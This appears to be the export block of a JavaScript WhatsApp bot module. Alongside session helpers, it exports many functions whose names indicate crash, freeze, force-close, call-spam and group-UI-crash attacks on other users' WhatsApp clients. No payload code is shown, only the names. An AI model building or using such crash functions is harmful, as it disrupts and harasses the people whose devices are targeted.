// EXPORTS (Tambahkan fungsi baru ke module.exports)
// ==========================================

module.exports = {
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  detectWATypeFromCreds,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  sleep,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
  crashNotificationVVIP,
  DelayBuldoHardFreezeByMia,
  dingleybymia,
  NanasCrashIos,
  ForcloseIos,
  FcClickByMia,
  gladiatorBlankV1,
  gladiatorBlankV2,
  delayspam,
  FreezeChatByMia,
  BarzzTamvan,
  VnXdelayJmbd,
  uno,
  FreezeByMia,
  NanasTerbitForce,
  fcAjaSih,
  DelayHardV5,
  DelayBuldoBlankByMia,
  GroupCrashUi,
  pay,
  DelayFreezeByMia,
  forceCloseMentalVVIP,
  blank5msg,
  permenCall,
  StickerFC,
  NeoLritzy,
};